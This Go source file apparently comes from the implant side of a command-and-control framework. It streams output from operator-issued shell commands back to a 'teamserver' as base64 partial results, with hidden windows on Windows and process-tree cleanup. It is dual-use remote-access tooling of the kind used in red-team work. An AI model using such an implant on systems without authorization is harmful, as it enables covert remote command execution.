package main

// Streaming shell execution for long-running commands.
//
// runShell buffers the whole output and returns it on completion, which
// leaves operators blind for the entire duration of dumps, scans or installs.
// runShellStreaming keeps identical process construction and teardown but
// periodically hands newly produced output to an onDelta callback; handleShell
// turns those deltas into Partial task results so the teamserver can render
// progress live over its existing WS pipeline.

import (
	"context"
	"encoding/base64"
	"fmt"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	// streamFlushInterval is the delta flush cadence once streaming is live.
	streamFlushInterval = 2 * time.Second
	// streamFirstFlushDelay gates the first flush: fast commands finish long
	// before this and produce zero partials, keeping the pipeline quiet.
	streamFirstFlushDelay = 3 * time.Second
	// streamMinFlushBytes: with the 2 s ticker bounding cadence, any new byte
	// is worth shipping — operators watch long quiet commands precisely for
	// that first line of output.
	streamMinFlushBytes = 1
)

// partialSeq numbers partial results per process so the server's idempotency
// ledger never sees two identical rids for one task.
var partialSeq uint64

// streamBuf is a concurrency-safe byte sink doubling as cmd.Stdout/Stderr.
type streamBuf struct {
	mu sync.Mutex
	b  []byte
}

func (s *streamBuf) Write(p []byte) (int, error) {
	s.mu.Lock()
	s.b = append(s.b, p...)
	s.mu.Unlock()
	return len(p), nil
}

func (s *streamBuf) snapshot() []byte {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]byte, len(s.b))
	copy(out, s.b)
	return out
}

// buildShellCmd mirrors runShell's per-platform construction exactly (UTF-8
// forcing prefixes included) so streamed text decodes identically.
func buildShellCmd(ctx context.Context, cmdStr, shell string) *exec.Cmd {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if shell == "powershell.exe" || strings.Contains(strings.ToLower(shell), "powershell") {
			if !strings.Contains(cmdStr, "OutputEncoding") {
				cmdStr = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8; " + cmdStr
			}
			cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
		} else {
			cmd = exec.CommandContext(ctx, "cmd.exe", "/C", "chcp 65001 >nul & "+cmdStr)
		}
		applyHideWindow(cmd)
	} else {
		if shell == "" || shell == "bash" {
			cmd = exec.CommandContext(ctx, "bash", "-c", cmdStr)
		} else {
			cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
		}
		setShellProcGroup(cmd)
	}
	return cmd
}

// killProcessTree reproduces runShell's orphan cleanup after a context cancel.
func killProcessTree(cmd *exec.Cmd) {
	if cmd.Process == nil {
		return
	}
	if runtime.GOOS == "windows" {
		_ = exec.Command("taskkill", "/F", "/T", "/PID", strconv.Itoa(cmd.Process.Pid)).Run()
	} else {
		killShellProcGroup(cmd)
	}
}

// runShellStreaming executes cmdStr like runShell, invoking onDelta with the
// freshly decoded suffix whenever enough new output accumulated after the
// first-flush delay. The returned string is the FULL decoded output — the
// final result path stays byte-for-byte compatible with runShell. A nil
// onDelta degrades to buffered behaviour with zero flush overhead beyond a
// no-op check.
func runShellStreaming(cmdStr, shell string, onDelta func(delta string)) (string, error) {
	ctx := currentExecCtx()
	cmd := buildShellCmd(ctx, cmdStr, shell)

	sb := &streamBuf{}
	cmd.Stdout = sb
	cmd.Stderr = sb

	start := time.Now()
	_ = start
	if err := cmd.Start(); err != nil {
		return "", err
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	var waitErr error
	lastDecoded := 0
	if onDelta != nil {
		ticker := time.NewTicker(streamFlushInterval)
		defer ticker.Stop()
		firstGate := time.After(streamFirstFlushDelay)
		flush := func() {
			full := decodeShellOutput(sb.snapshot(), shell)
			if len(full) > lastDecoded && len(full)-lastDecoded >= streamMinFlushBytes {
				onDelta(full[lastDecoded:])
				lastDecoded = len(full)
			}
		}
	flushLoop:
		for {
			select {
			case waitErr = <-done:
				// Terminal result carries the FULL output; emitting a trailing
				// delta here would duplicate it server-side.
				break flushLoop
			case <-firstGate:
				flush()
				firstGate = nil // disable: time.After channels fire once
			case <-ticker.C:
				flush()
			}
		}
	} else {
		waitErr = <-done
	}

	if waitErr != nil && ctx.Err() != nil {
		killProcessTree(cmd)
	}
	full := decodeShellOutput(sb.snapshot(), shell)
	return full, waitErr
}

// enqueuePartialResult ships one streaming chunk as a Partial result with a
// unique rid (taskID-seq) so replay protection never collides with the final
// result's rid.
func enqueuePartialResult(task Task, delta string) {
	seq := atomic.AddUint64(&partialSeq, 1)
	enqueueResult(TaskResult{
		TaskID:   task.ID,
		Type:     task.Type,
		Output:   base64.StdEncoding.EncodeToString([]byte(delta)),
		Encoding: "base64",
		Partial:  true,
		ResultID: fmt.Sprintf("%d-p-%d", task.ID, seq),
	})
}
